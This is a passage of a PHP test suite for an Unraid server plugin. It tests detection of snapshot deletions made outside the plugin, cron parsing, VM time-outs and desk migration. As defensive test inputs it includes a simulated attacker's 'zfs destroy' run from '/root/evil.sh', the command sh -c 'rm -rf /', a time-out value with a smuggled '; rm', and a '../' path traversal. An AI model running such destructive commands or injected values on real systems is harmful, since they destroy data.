    $ini = fn (bool $coldAsleep) => file_put_contents("$src/disks.ini", "[\"hive\"]\nname=\"hive\"\ntype=\"Cache\"\nfsType=\"zfs\"\nspundown=\"0\"\n"
        . "[\"cold\"]\nname=\"cold\"\ntype=\"Cache\"\nfsType=\"luks:zfs\"\nspundown=\"" . ($coldAsleep ? 1 : 0) . "\"\n"
        . "[\"disk1\"]\nname=\"disk1\"\ntype=\"Data\"\nfsType=\"luks:btrfs\"\nfsStatus=\"Mounted\"\nspundown=\"0\"\n"
        . "[\"disk3\"]\nname=\"disk3\"\ntype=\"Data\"\nfsType=\"btrfs\"\nfsStatus=\"Mounted\"\nspundown=\"1\"\n"
        . "[\"flash\"]\nname=\"flash\"\ntype=\"Boot\"\nfsType=\"zfs\"\nspundown=\"0\"\n");
    $ini(false);
    $snaps = ['hive/data@uso-backup-20261001-0100' => ['11', 0], 'hive/data@uso-backup-20261006-0100' => ['12', 0],
              'hive/data@uso-plan-daily-20261001-0100' => ['13', 0], 'hive/data@uso-plan-daily-20261006-0100' => ['14', 0],
              'hive/data@manual' => ['15', 0], 'hive/data@keep' => ['16', 1],
              'hive/media@uso-plan-x-20261005-0100' => ['21', 0], 'hive/media@uso-plan-x-20261006-0100' => ['22', 0], 'hive/media@held' => ['23', 1],
              'hive/_UnraidSecretaryOffice-trash-20261006-110000-old@uso-backup-20261001-0100' => ['31', 0], "$docker@123" => ['41', 0],
              'cold/x@a' => ['51', 0], 'flash/cfg@b' => ['61', 0]];
    $write = function () use (&$snaps, $src) {
        file_put_contents("$src/zfs-list.txt", implode('', array_map(fn ($k, $v) => "$k\t$v[0]\t$v[1]\n", array_keys($snaps), $snaps)));
    };
    $write();
    // stand-ins: zfs lists only the pools it is asked for (and fails while zfs-fails is there); zpool history
    file_put_contents("$tmp/zfs", "#!/bin/sh\nprintf '%s\\n' \"\$*\" >> " . escapeshellarg("$src/zfs-args.txt") . "\n[ -e " . escapeshellarg("$src/zfs-fails") . " ] && exit 1\n"
        . "seen=0\nfor a in \"\$@\"; do\n  [ \$seen = 1 ] && grep -E \"^\$a[/@]\" " . escapeshellarg("$src/zfs-list.txt") . "\n  [ \"\$a\" = -r ] && seen=1\ndone\nexit 0\n");
    file_put_contents("$tmp/zpool", "#!/bin/sh\n[ \"\$1\" = history ] && [ \"\$2\" = -l ] && cat " . escapeshellarg("$src/zpool-history.txt") . "\nexit 0\n");
    chmod("$tmp/zfs", 0755);
    chmod("$tmp/zpool", 0755);
    file_put_contents("$src/zpool-history.txt", '');
    file_put_contents("$src/passwd", "root:x:0:0::/root:/bin/bash\n");
    file_put_contents("$src/syslog", "Oct  6 11:59:00 tower kernel: hello\n");
    $paths = ['syslog' => "$src/syslog", 'plugins' => "$src/plugins", 'go' => "$src/go", 'extra' => "$src/extra", 'passwd' => "$src/passwd",
              'shadow' => "$src/shadow", 'ssh' => "$src/ssh", 'sec' => "$src/sec.ini", 'sec_nfs' => "$src/sec_nfs.ini", 'share_cfg' => "$src/share.cfg",
              'etc_passwd' => "$src/passwd", 'disks_ini' => "$src/disks.ini", 'zfs' => "$tmp/zfs", 'zpool' => "$tmp/zpool", 'mnt' => "$src/mnt",
              'agent_log' => $log, 'engine' => "$src/engine"];
    $round = fn (int $t) => watchmanRound($paths, $data, 1000, $now + $t, fn () => [], false, "$tmp/acks.json", null, true);
    $open = fn () => array_column(array_values(array_filter(watchmanLoad($data)['book'], fn ($e) => watchmanOpen($e) && WATCH_KINDS[$e['kind']][0] === 'snap')), null, 'key');
    $summary = fn () => (readJson("$data/state.json") ?? [])['snaps'] ?? null;

    // his first round: all of it normal; Docker's layers, the boot pool and the sleeping disk left out
    $round(0);
    same('snaps: the first round — nothing told; per pool and disk, the sleeping one named', [[], ['hive' => 10, 'cold' => 1], ['disk1' => 3], ['disk3']],
        [$open(), $summary()['zfs'] ?? null, $summary()['btrfs'] ?? null, $summary()['asleep'] ?? null]);
    same('snaps: zfs asked for the awake pools only (never the boot pool)', 'list -H -p -t snapshot -o name,guid,userrefs -r hive cold',
        trim((string) file_get_contents("$src/zfs-args.txt")));
    check('snaps: the lists kept for the next round (snaps.json)', isset((readJson("$data/snaps.json") ?? [])['zfs']['hive']['s']['hive/data@keep']));

    // what the office does: Ms. Snapshotini deletes, releases (her log), renames; the engine's run prunes (with a newer one of its
    // own staying); the storeroom is emptied — nothing told
    file_put_contents($log, "2026-10-06 12:02:00  Deleted: hive/data@uso-plan-daily-20261001-0100\n2026-10-06 12:02:01  Released: hive/data@keep\n"
        . "2026-10-06 12:02:02  Renamed: hive/data manual → manual2\n2026-10-06 12:02:03  Snapshot scan: 9 snapshots\n", FILE_APPEND);
    file_put_contents("$src/engine/state/history.jsonl", json_encode(['mode' => 'backup', 'result' => 'ok', 'started' => $now + 100, 'finished' => $now + 250]) . "\n", FILE_APPEND);
    unset($snaps['hive/data@uso-plan-daily-20261001-0100'], $snaps['hive/data@uso-backup-20261001-0100'], $snaps['hive/data@manual'],
        $snaps['hive/_UnraidSecretaryOffice-trash-20261006-110000-old@uso-backup-20261001-0100']);
    $snaps['hive/data@manual2'] = ['15', 0];
    $snaps['hive/data@keep'] = ['16', 0];
    $write();
    rmdir("$src/mnt/disk1/.btrfs-snap/20261001-0100");
    $round(300);
    same('snaps: what the office removed — Ms. Snapshotini, the engine\'s retention (ZFS and btrfs), renamed, the storeroom — no news',
        [[], ['engine' => 2, 'office' => 2, 'renamed' => 1, 'storeroom' => 1]], [$open(), $summary()['expected'] ?? null]);

    // an attacker: the newest of the engine's (no run now), a renamed one, one of a plan; a hold released; on disk1 a snapshot of a
    // plan — while cold sleeps (its snapshot missing from the list is never "gone")
    $ini(true);
    unset($snaps['hive/data@uso-backup-20261006-0100'], $snaps['hive/data@manual2'], $snaps['hive/media@uso-plan-x-20261005-0100'], $snaps['cold/x@a']);
    $snaps['hive/media@held'] = ['23', 0];
    $write();
    rmdir("$src/mnt/disk1/.btrfs-snap/uso-plan-b-20261006-0100");
    file_put_contents("$src/engine/state/history.jsonl", json_encode(['mode' => 'backup', 'result' => 'skipped', 'started' => $now + 500, 'finished' => $now + 500]) . "\n", FILE_APPEND);
    file_put_contents("$src/zpool-history.txt", "2026-10-06.11:00:00 zfs destroy hive/data@older [user 0 (root) on tower:linux]\n"
        . "2026-10-06.12:07:30 zfs destroy hive/data@uso-backup-20261006-0100,manual2 [user 0 (root) on tower:linux]\n"
        . "2026-10-06.12:07:31 zfs release unraid-secretary-office hive/media@held [user 0 (root) on tower:linux]\n"
        . "2026-10-06.12:07:32 zfs destroy hive/media@uso-plan-x-20261005-0100 [user 0 (root) on tower:linux]\n"
        . "2026-10-06.12:07:33 zfs snapshot hive/data@new [user 0 (root) on tower:linux]\n");
    file_put_contents("$src/syslog", "Oct  6 12:07:29 tower root: zfs destroy started by /root/evil.sh\nOct  6 12:07:31 tower kernel: nothing to see\n", FILE_APPEND);
    $round(600);
    $o = $open();
    $g = $o['snap_gone:zfs:hive'] ?? [];
    same('snaps gone: on hive — how many, which datasets, a few of them, their series, zpool history (who, when), the syslog then',
        [3, ['hive/data', 'hive/media'], ['hive/data@manual2', 'hive/data@uso-backup-20261006-0100', 'hive/media@uso-plan-x-20261005-0100'], ['manual#', 'uso-backup-#-#', 'uso-plan-x-#-#'], 0,
         ['2026-10-06 12:07:30 zfs destroy hive/data@uso-backup-20261006-0100,manual2 [user 0 (root) on tower:linux]',
          '2026-10-06 12:07:31 zfs release unraid-secretary-office hive/media@held [user 0 (root) on tower:linux]',
          '2026-10-06 12:07:32 zfs destroy hive/media@uso-plan-x-20261005-0100 [user 0 (root) on tower:linux]'],
         ['12:07:29 root: zfs destroy started by /root/evil.sh']],
        [$g['count'] ?? null, $g['p']['datasets'] ?? null, $g['p']['names'] ?? null, $g['p']['series'] ?? null, $g['p']['held'] ?? null, $g['p']['history'] ?? null, $g['p']['evidence'] ?? null]);
    same('snaps gone: on disk1 (btrfs) — and nothing for cold, asleep', [['snap_gone:btrfs:disk1', 'snap_gone:zfs:hive', 'snap_hold_released:zfs:hive'], ['disk1/.btrfs-snap/uso-plan-b-20261006-0100'], []],
        [(function (array $a) { sort($a); return $a; })(array_keys($o)), $o['snap_gone:btrfs:disk1']['p']['names'] ?? null, $o['snap_gone:btrfs:disk1']['p']['history'] ?? null]);
    same('snaps: a hold released, not by Ms. Snapshotini', [1, ['hive/media@held'], 2],
        [$o['snap_hold_released:zfs:hive']['count'] ?? null, $o['snap_hold_released:zfs:hive']['p']['names'] ?? null, count($o['snap_hold_released:zfs:hive']['p']['history'] ?? [])]);
    same('snaps gone in words', '3 snapshots vanished on hive — not removed by the office: hive/data@manual2, hive/data@uso-backup-20261006-0100, hive/media@uso-plan-x-20261005-0100',
        officeNotifyText('watchman', 'entry.snap_gone', ['n' => 3] + watchmanText($g, 'en'), 'en'));
    $checks = array_column(watchmanChecks($data), null, 'id');
    same('snaps: the team lead hears of both — important, so to Unraid\'s notifications too', ['recommended', 'recommended', true, true],
        [$checks['snap_gone']['level'] ?? null, $checks['snap_hold_released']['level'] ?? null, WATCH_KINDS['snap_gone'][1], WATCH_KINDS['snap_hold_released'][1]]);
    same('snaps: the sleeping pool named', ['cold', 'disk3'], $summary()['asleep'] ?? null);

    // cold awake again, its snapshot there: it slept, nothing went
    $ini(false);
    $snaps['cold/x@a'] = ['51', 0];
    $snaps['hive/media@uso-plan-x-20261007-0100'] = ['24', 0];
    $write();
    $round(900);
    same('snaps: a pool that slept is compared with its list from before — nothing gone', [3, 1], [$open()['snap_gone:zfs:hive']['count'] ?? null, count($open()) === 3 ? 1 : 0]);

    // «I know, thanks»: a retention of yours — its series may go while a newer one stays; another series, or the last of one, is told
    watchmanAck($g['id'], $data, $now + 950, false);
    same('snaps ack: the series learned', ['manual#', 'uso-backup-#-#', 'uso-plan-x-#-#'], array_keys(watchmanLoad($data)['baseline']['snaps']['series'] ?? []));
    unset($snaps['hive/media@uso-plan-x-20261006-0100'], $snaps['hive/data@uso-plan-daily-20261006-0100']);
    $write();
    $round(1200);
    $o = $open();
    same('snaps learned: a plan of yours pruned (a newer one stays) is quiet; another series is told', [1, ['hive/data@uso-plan-daily-20261006-0100']],
        [$o['snap_gone:zfs:hive']['count'] ?? null, $o['snap_gone:zfs:hive']['p']['names'] ?? null]);

    // zfs not answering: nothing compared, the lists kept — what went meanwhile is told once it answers again
    touch("$src/zfs-fails");
    unset($snaps['cold/x@a']);
    $write();
    $round(1500);
    same('snaps: zfs not answering — nothing told, the list kept', [false, true], [isset($open()['snap_gone:zfs:cold']), isset((readJson("$data/snaps.json") ?? [])['zfs']['cold']['s']['cold/x@a'])]);
    unlink("$src/zfs-fails");
    $round(1800);
    same('snaps: answering again — what went meanwhile', ['cold/x@a'], $open()['snap_gone:zfs:cold']['p']['names'] ?? null);

    // the page: what he follows
    $page = watchmanPageState($data, $now + 1810, false);
    same('snaps on the page: per pool and disk, the series learned', [['hive' => 3, 'cold' => 0], ['disk1' => 1], ['manual#', 'uso-backup-#-#', 'uso-plan-x-#-#']],
        [$page['snaps']['zfs'] ?? null, $page['snaps']['btrfs'] ?? null, $page['snaps']['series'] ?? null]);
    $en = json_decode((string) file_get_contents(OFFICE_DIR . '/public/desks/watchman/lang/en.json'), true) ?: [];
    check('snaps: the page\'s words', isset($en['group.snap'], $en['group_title.snap'], $en['watch.snaps'], $en['help.snaps_text'], $en['detail.history']));
    @unlink(watchmanLockFile($data, 'book'));
    @unlink(watchmanLockFile($data, 'round'));
    exec('rm -rf ' . escapeshellarg($tmp));
}

/**
 * «Where is what» (Ms. Whereabouts' up to 1.30, Ms. Dustdevil's now) after the night watchman took
 * security: her cron lines whose program went with its plugin (order, not security — the watchman no
 * longer tells them), her tips that stayed, the ones that went to him, and the one that points to him
 * while he isn't hired.
 */
function testWhereAfterWatchman(): void
{
    same('wa cron: the program behind an interpreter, none for inline code or a name', ['/usr/local/x/run.php', '/a/b.sh', null, null, '/x'],
        [waCronProgram('/usr/bin/php -q /usr/local/x/run.php arg'), waCronProgram('nice -n 10 bash "/a/b.sh" x'),
         waCronProgram("sh -c 'rm -rf /'"), waCronProgram('logger hello'), waCronProgram('timeout 60 LANG=C /x')]);
    $gone = fn (string $p) => false;
    same('wa cron: a program gone with its plugin (never under /mnt, never odd characters, never outside a plugin\'s folder)', ['vmbackup', 'oldplug', null, null, null],
        [waCronGone('/usr/local/emhttp/plugins/vmbackup/runscript.php', $gone), waCronGone('/boot/config/plugins/oldplug/x.sh', $gone),
         waCronGone('/mnt/user/x/y.sh', $gone), waCronGone('/usr/local/sbin/mdcmd', $gone), waCronGone("/usr/local/emhttp/plugins/x/a'b.sh", $gone)]);
    same('wa cron: still there — nothing to say', null, waCronGone('/usr/local/emhttp/plugins/vmbackup/runscript.php', fn (string $p) => true));

    $js = (string) file_get_contents(OFFICE_DIR . '/public/desks/cleanup/desk.js');
    $en = json_decode((string) file_get_contents(OFFICE_DIR . '/public/desks/cleanup/lang/en.json'), true) ?: [];
    foreach (array_keys(WATCH_POSTURE) as $id) {
        check("where: security tip $id is the watchman's now", !str_contains($js, "add('$id',") && !isset($en["where.adv.$id.title"]));
    }
    foreach (['system_array', 'mover', 'compose_build', 'spindown_default', 'spindown_some', 'old_disks', 'no_parity', 'parity', 'ups', 'syslog', 'cron_dead', 'vm_windows', 'security'] as $id) {
        check("where: tip $id is hers", str_contains($js, "add('$id',") && isset($en["where.adv.$id.title"], $en["where.adv.$id.why"]));
    }
    $advice = waAdvice([], [], []);
    same('where: her advice reads no security settings any more', [false, false, false], [isset($advice['telnet']), isset($advice['ftp']), isset($advice['cpu'])]);
}

/**
 * Ms. Dustdevil's tip about Windows VMs at the array stop (Ms. Whereabouts' up to 1.30; Benj, 2026-10-07: the array stop waited
 * domain.cfg's TIMEOUT="180" for an idle Windows 11 that ignored the power button, then Unraid switched
 * it off hard): the VM shutdown and disk shutdown time-outs as Unraid reads them, and whether the guest
 * agent answers — from libvirt's status file of a running VM (RAM), the shape nostromo's has.
 */
function testWhereVmStop(): void
{
    same('wa vm stop: the time-outs as set', ['timeout' => 180, 'disk_timeout' => 400], waVmStop(['TIMEOUT' => '180'], ['shutdownTimeout' => '400']));
    same('wa vm stop: empty or odd — Unraid\'s defaults (60 s, 90 s)', [['timeout' => 60, 'disk_timeout' => 90], ['timeout' => 60, 'disk_timeout' => 90]],
        [waVmStop([], []), waVmStop(['TIMEOUT' => '-5'], ['shutdownTimeout' => "90\n; rm"])]);

    $status = fn (string $channel) => "<domstatus state='running' reason='booted' pid='3046851'>\n  <monitor path='/var/lib/libvirt/qemu/domain-3/monitor.sock' type='unix'/>\n"
        . "  <domain type='kvm' id='3'>\n    <name>Windows_11_Tom_1</name>\n    <metadata>\n      <vmtemplate xmlns=\"http://unraid\" name=\"Windows 11\" os=\"windowstpm\"/>\n    </metadata>\n"
        . "    <devices>\n      <channel type='unix'>\n        <source mode='bind' path='/run/libvirt/qemu/channel/3-Windows_11_Tom_1/org.qemu.guest_agent.0'/>\n"
        . "        $channel\n        <alias name='channel0'/>\n      </channel>\n    </devices>\n  </domain>\n</domstatus>\n";
    same('wa vm agent: the guest agent answers / doesn\'t / no state yet / no channel / unreadable', ['connected', 'disconnected', 'disconnected', 'none', null, null],
        [waVmAgentState($status("<target type='virtio' name='org.qemu.guest_agent.0' state='connected'/>")),
         waVmAgentState($status("<target type='virtio' name='org.qemu.guest_agent.0' state='disconnected'/>")),
         waVmAgentState($status("<target type='virtio' name='org.qemu.guest_agent.0'/>")),
         waVmAgentState($status("<target type='virtio' name='org.qemu.spice.0' state='connected'/>")),
         waVmAgentState('<domstatus'), waVmAgentState('')]);
    $tmp = hardeningTmp('wavmstop');
    file_put_contents("$tmp/Win11.xml", $status("<target type='virtio' name='org.qemu.guest_agent.0' state='connected'/>"));
    symlink("$tmp/Win11.xml", "$tmp/Linked.xml");
    same('wa vm agent: by the VM\'s name — not a link, no path in the name, nothing when there is no file', ['connected', null, null, null, null],
        [waVmAgent('Win11', $tmp), waVmAgent('Linked', $tmp), waVmAgent('../' . basename($tmp) . '/Win11', $tmp), waVmAgent('.hidden', $tmp), waVmAgent('Gone', $tmp)]);
    hardeningRm($tmp);

    $js = (string) file_get_contents(OFFICE_DIR . '/public/desks/cleanup/desk.js');
    $en = json_decode((string) file_get_contents(OFFICE_DIR . '/public/desks/cleanup/lang/en.json'), true) ?: [];
    check('where: the Windows VM tip is hers, with the current time-outs', str_contains($js, "add('vm_windows',") && isset($en['where.adv.vm_windows.title'], $en['where.adv.vm_windows.why'])
        && str_contains($en['where.adv.vm_windows.why']['other'] ?? '', '{timeout}') && str_contains($en['where.adv.vm_windows.why']['other'] ?? '', '{disk}'));
}

/**
 * Ms. Dustdevil takes over Ms. Whereabouts' files once (2026-10): her state (only while the new one isn't there),
 * what du measured (merged — what was measured later wins, never lost), only plain JSON files of the folder; then
 * the old ones are gone and a second start does nothing.
 */
function testWhereTakeOver(): void
{
    $tmp = hardeningTmp('where-takeover');
    $state = ['time' => 100, 'shares' => [['name' => 'appdata']], 'containers' => [], 'scripts' => []];
    file_put_contents("$tmp/whereabouts.json", json_encode($state));
    file_put_contents("$tmp/whereabouts-sizes.json", json_encode(['sizes' => [
        '/mnt/user/a' => ['bytes' => 1, 'at' => 100], '/mnt/user/b' => ['bytes' => 2, 'at' => 200]], 'queue' => ['/mnt/user/q'], 'running' => ['/mnt/user/r']]));
    file_put_contents("$tmp/cleanup-where-sizes.json", json_encode(['sizes' => [
        '/mnt/user/b' => ['bytes' => 22, 'at' => 300], '/mnt/user/c' => ['bytes' => 3, 'at' => 50]], 'queue' => [], 'running' => []]));
    $done = whereTakeOver($tmp);
    same('where takeover: both files', ['whereabouts.json → cleanup-where.json', 'whereabouts-sizes.json → cleanup-where-sizes.json'], $done);
    same('where takeover: the old files are gone', [false, false], [file_exists("$tmp/whereabouts.json"), file_exists("$tmp/whereabouts-sizes.json")]);
    same('where takeover: her state as it was', $state, json_decode((string) file_get_contents("$tmp/cleanup-where.json"), true));
    $sizes = json_decode((string) file_get_contents("$tmp/cleanup-where-sizes.json"), true);
    same('where takeover: every size kept, the later measurement wins, no old jobs', [1, 22, 3, [], []],
        [$sizes['sizes']['/mnt/user/a']['bytes'] ?? null, $sizes['sizes']['/mnt/user/b']['bytes'] ?? null, $sizes['sizes']['/mnt/user/c']['bytes'] ?? null,
         $sizes['queue'] ?? null, $sizes['running'] ?? null]);
    same('where takeover: once', [], whereTakeOver($tmp));
    same('where takeover: no temporary files left', [], array_values(array_filter(scandir($tmp) ?: [], fn ($n) => str_ends_with($n, '.tmp'))));

    // a newer state of hers stays; an old one that is a link or no JSON is left alone
    file_put_contents("$tmp/whereabouts.json", json_encode(['time' => 1]));
    whereTakeOver($tmp);
    same('where takeover: her own newer state stays', 100, json_decode((string) file_get_contents("$tmp/cleanup-where.json"), true)['time'] ?? null);
    file_put_contents("$tmp/elsewhere.json", json_encode(['sizes' => ['/x' => ['bytes' => 9, 'at' => 999]]]));
    symlink("$tmp/elsewhere.json", "$tmp/whereabouts-sizes.json");
    same('where takeover: a link is no file of hers', ['whereabouts-sizes.json left alone (no plain file)'], whereTakeOver($tmp));
    unlink("$tmp/whereabouts-sizes.json");
    file_put_contents("$tmp/whereabouts-sizes.json", 'not json');
    same('where takeover: no JSON — left alone', ['whereabouts-sizes.json left alone (no JSON)'], whereTakeOver($tmp));
    same('where takeover: nothing from the link went in', false, isset(json_decode((string) file_get_contents("$tmp/cleanup-where-sizes.json"), true)['sizes']['/x']));
    hardeningRm($tmp);
}

/**
 * Ms. Whereabouts is no desk any more: Ms. Dustdevil has her actions, her tick work and her fit (every server — she
 * knows where everything is; without Docker and VMs there's just nothing to sweep up), the page asks for exactly
 * those actions and parts, and no text of the office names Ms. Whereabouts any more.
 */
function testWhereDesk(): void
{
    check('where desk: no desk whereabouts (agent, web)', !isset(desks()['whereabouts']) && !is_dir(OFFICE_DIR . '/public/desks/whereabouts')
        && !is_file(OFFICE_DIR . '/agent/desks/whereabouts.php'));
    $actions = array_keys(desks()['cleanup']['actions'] ?? []);
    same('where desk: Ms. Dustdevil has her actions', [], array_values(array_diff(['where_refresh', 'where_scan', 'where_measure', 'where_sizes'], $actions)));
    $fit = (desks()['cleanup']['fit'])();
    check('where desk: Ms. Dustdevil fits every server', $fit['ok'] === true && in_array($fit['why'], ['yes', 'where'], true));
    $js = (string) file_get_contents(OFFICE_DIR . '/public/desks/cleanup/desk.js');
    preg_match_all('/\$\{ID\}\.(where_[a-z_]+)`/', $js, $m);
    same('where desk: the page asks only for her actions', [], array_values(array_diff(array_unique($m[1]), $actions)));
    preg_match_all("/part: '([a-z-]+)'/", $js, $m);
    $parts = array_map(fn ($p) => "cleanup-$p.json", array_values(array_unique($m[1])));      // the API's data/<desk>-<part>.json
    sort($parts);
    same('where desk: the parts the page reads are her files', [WHERE_SIZES_FILE, WHERE_FILE], $parts);
    $core = (string) file_get_contents(OFFICE_DIR . '/public/assets/core.js');
    check('where desk: her look and her measuring stay quiet (no spinner)', (bool) preg_match('/const QUIET = .*where_refresh.*where_measure/', $core));
    check('where desk: both parts on her page', str_contains($js, "part(T('part.where')") && str_contains($js, "part(T('part.tidy')"));

    // nobody names her any more: the office's and every desk's texts, the Dashboard tile
    $names = '/Whereabouts|Wasistwo|Dovè|Saitout|Dondestá/u';
    $files = array_merge(glob(OFFICE_DIR . '/public/lang/*.json') ?: [], glob(OFFICE_DIR . '/public/desks/*/lang/*.json') ?: [], [OFFICE_DIR . '/src/dashboard.php']);
    $named = array_values(array_filter($files, fn ($f) => preg_match($names, (string) file_get_contents($f)) === 1));
    same('where desk: no text names Ms. Whereabouts any more', [], array_map(fn ($f) => substr($f, strlen(OFFICE_DIR) + 1), $named));
}

/**
 * The staff list: a server that had Ms. Whereabouts hired has Ms. Dustdevil hired (since the earlier of the two),
 * Ms. Whereabouts gone from the list — rewritten once by the web side (src/staff.php, under its lock, new file +
 * rename); until then the agent counts her as Ms. Dustdevil.
 */
function testStaffMerged(): void
{
    require_once OFFICE_DIR . '/src/staff.php';
    same('staff merged: the agent\'s list and the web side\'s are the same', OFFICE_DESKS_MERGED, STAFF_MERGED);
    $desks = ['backup' => [], 'cleanup' => [], 'caretaker' => []];
    same('staff merged: whereabouts becomes cleanup, since the earlier', ['backup' => 5, 'cleanup' => 7],
        officeStaffMerged(['hired' => ['backup' => 5, 'whereabouts' => 7, 'cleanup' => 9]], $desks)['hired'] ?? null);
    same('staff merged: cleanup hired earlier keeps its time', ['cleanup' => 3], officeStaffMerged(['hired' => ['whereabouts' => 7, 'cleanup' => 3]], $desks)['hired'] ?? null);
    same('staff merged: only whereabouts hired', ['backup' => 5, 'cleanup' => 7], officeStaffMerged(['hired' => ['backup' => 5, 'whereabouts' => 7]], $desks)['hired'] ?? null);
    same('staff merged: nothing to do', [null, null], [officeStaffMerged(['hired' => ['cleanup' => 1]], $desks), officeStaffMerged([], $desks)]);
    same('staff merged: not while whereabouts is still a desk, nor without cleanup', [null, null],
        [officeStaffMerged(['hired' => ['whereabouts' => 7]], $desks + ['whereabouts' => []]), officeStaffMerged(['hired' => ['whereabouts' => 7]], ['backup' => []])]);
    same('staff merged: the agent counts her as Ms. Dustdevil until then', ['backup', 'cleanup', 'cleanup'],
        staffMergedIds(['backup', 'whereabouts', 'cleanup'], $desks));
    same('staff merged: the agent leaves a desk that is there alone', ['whereabouts'], staffMergedIds(['whereabouts'], ['whereabouts' => []]));

    // the web side rewrites staff.json once (a process of its own: bootstrap.php, the data folder in $tmp)
    $tmp = hardeningTmp('staff-merged');
    mkdir("$tmp/office", 0700);
    $file = "$tmp/office/staff.json";
    file_put_contents($file, json_encode(['hired' => ['backup' => 5, 'whereabouts' => 7, 'watchman' => 8], 'other' => 'kept']));
    $web = "$tmp/web.php";
    file_put_contents($web, '<?php require ' . var_export(OFFICE_DIR . '/src/bootstrap.php', true) . ';'
        . ' $desks = ["backup" => [], "cleanup" => [], "watchman" => []]; $f = ' . var_export($file, true) . ';'
        . ' echo json_encode([officeStaffMigrate($f, $desks), officeStaffMigrate($f, $desks)]);');
    $run = function () use ($web, $tmp): array {
        $p = proc_open([PHP_BINARY, $web], [0 => ['file', '/dev/null', 'r'], 1 => ['pipe', 'w'], 2 => ['pipe', 'w']], $pipes, null,
            ['OFFICE_DATA_DIR' => $tmp, 'PATH' => getenv('PATH')]);
        $raw = (string) stream_get_contents($pipes[1]) . (string) stream_get_contents($pipes[2]);
        proc_close($p);
        return [json_decode($raw, true), $raw];
    };
    [$out, $raw] = $run();
    $saved = json_decode((string) file_get_contents($file), true);
    same('staff migrate: written once — whereabouts is cleanup now, the rest as it was', ['hired' => ['backup' => 5, 'watchman' => 8, 'cleanup' => 7], 'other' => 'kept'], $saved);
    same('staff migrate: the second time changes nothing', $saved, $out[1] ?? $raw);
    same('staff migrate: mode and no temporary files', ['644', []], [substr(sprintf('%o', fileperms($file)), -3),
        array_values(array_filter(scandir("$tmp/office") ?: [], fn ($n) => str_ends_with($n, '.tmp')))]);
    hardeningRm($tmp);
}

/**
 * Old addresses of a desk that went into another one lead to the part of the page that took it over
 * (core.js movedDesk(), under node): #/whereabouts… → #/cleanup/where; nothing else is touched.
 */
function testMovedDesk(): void
{
    require_once OFFICE_DIR . '/src/staff.php';
    $core = (string) file_get_contents(OFFICE_DIR . '/public/assets/core.js');
    check('moved desk: core.js knows Ms. Whereabouts\' old address', (bool) preg_match("/const MOVED_DESKS = \\{ whereabouts: 'cleanup\\/where' \\};/", $core));
    foreach (OFFICE_DESKS_MERGED as $old => $new) {
        check("moved desk: $old leads to $new's page", str_contains($core, "$old: '$new/"));
    }
    $node = trim((string) shell_exec('command -v node 2>/dev/null')) ?: (is_executable('/usr/local/bin/node') ? '/usr/local/bin/node' : '');
    if ($node === '') {
        check('moved desk: node is missing here - skipped', true);
        return;
    }
    if (!preg_match('/^const MOVED_DESKS = .*?\n^function movedDesk\(.*?\n\}\n/sm', $core, $m)) {
        check('moved desk: movedDesk() found in core.js', false);
        return;
    }
    $tmp = hardeningTmp('moved-desk');
    file_put_contents("$tmp/t.js", $m[0] . "\nconst known = (id) => ['cleanup', 'backup'].includes(id);\n"
        . "console.log(JSON.stringify(['#/whereabouts', '#/whereabouts/x/y', '#whereabouts', '#/cleanup', '#/backup/setup', '#/', '', '#/constructor', '#/toString']"
        . ".map((h) => movedDesk(h, known)).concat([movedDesk('#/whereabouts', () => true)])));\n");
    $out = json_decode((string) shell_exec(escapeshellarg($node) . ' ' . escapeshellarg("$tmp/t.js") . ' 2>&1'), true);
    same('moved desk: old addresses lead to «Where is what», the rest stays, not while the old desk is there',
        ['#/cleanup/where', '#/cleanup/where', '#/cleanup/where', null, null, null, null, null, null, null], $out);
    hardeningRm($tmp);
}

/**
 * The supporter key (src/supporter.php) — a thank-you that unlocks nothing: the server ID, the team
 * lead's one ask, the file, and the office actions end to end through the web side (a process of its own).
 * Keys are made with a throw-away key pair; only a fixed key made by tools/supporter-key.sh on the
 * maintainer's Mac checks the real public key.
 */
function supporterTestKeys(string $dir): array
{
    $pair = openssl_pkey_new(['private_key_type' => OPENSSL_KEYTYPE_EC, 'curve_name' => 'prime256v1']);
    openssl_pkey_export($pair, $pem);
    $old = umask(0077);
    file_put_contents("$dir/private.pem", $pem);
    umask($old);
    file_put_contents("$dir/public.pem", openssl_pkey_get_details($pair)['key']);
    $make = function (string $json, $key = null) use ($pair): string {
        $head = 'USO1.' . officeB64url($json);
        openssl_sign($head, $sig, $key ?? $pair, OPENSSL_ALGO_SHA256);
        return $head . '.' . officeB64url($sig);
    };
    return [$make, "$dir/private.pem", "$dir/public.pem"];
}

function testSupporter(): void
{
    require_once OFFICE_DIR . '/src/supporter.php';
    $tmp = hardeningTmp('supporter');

    // the server ID: regGUID (flashGUID while it is empty), upper-cased, hashed — the GUID never shows
    same('supporter: server ID of a GUID', 'FF81-6F6B-7F71-70E8', officeServerIdOf('0781-5583-A1B2-123456789012'));
    same('supporter: server ID of a newer GUID (any letters)', '1FA2-6ACF-DA17-9166', officeServerIdOf('AB-CDEFGHJKLMNPQRSTUVWXYZ23'));
    same('supporter: the GUID upper-cased first', 'FF81-6F6B-7F71-70E8', officeServerIdOf('0781-5583-a1b2-123456789012'));
    $ini = function (string $text) use ($tmp): string {
        file_put_contents("$tmp/var.ini", $text);
        return "$tmp/var.ini";
    };
    same('supporter: regGUID first', '1FA2-6ACF-DA17-9166', officeServerId($ini("flashGUID=\"0781-5583-A1B2-123456789012\"\nregGUID=\"AB-CDEFGHJKLMNPQRSTUVWXYZ23\"\n")));
    same('supporter: flashGUID while regGUID is empty', 'FF81-6F6B-7F71-70E8', officeServerId($ini("flashGUID=\"0781-5583-A1B2-123456789012\"\nregGUID=\"\"\n")));
    same('supporter: no GUID, no ID', null, officeServerId($ini("regGUID=\"\"\n")));
    same('supporter: an odd GUID, no ID', null, officeServerId($ini("regGUID=\"a/../b\"\n")));
    same('supporter: no var.ini, no ID', null, officeServerId("$tmp/missing.ini"));

    // the team lead's one ask: a week after the first sight, «Not now» at most twice more, never with a key
    $day = 86400;
    $t0 = 1790000000;
    $data = ['first_seen' => $t0];
    same('ask: not in the first week', false, officeSupporterAskDue($data, false, $t0 + 7 * $day - 1));
    same('ask: after a week', true, officeSupporterAskDue($data, false, $t0 + 7 * $day));
    same('ask: never with a valid key', false, officeSupporterAskDue($data, true, $t0 + 7 * $day));
    same('ask: never without a first sight', false, officeSupporterAskDue([], false, $t0));
    $now = $t0 + 8 * $day;
    $asked = [];
    for ($i = 0; $i < 4; $i++) {
        $asked[] = officeSupporterAskDue($data, false, $now);
        $data = officeSupporterAnswer($data, 'later', $now);
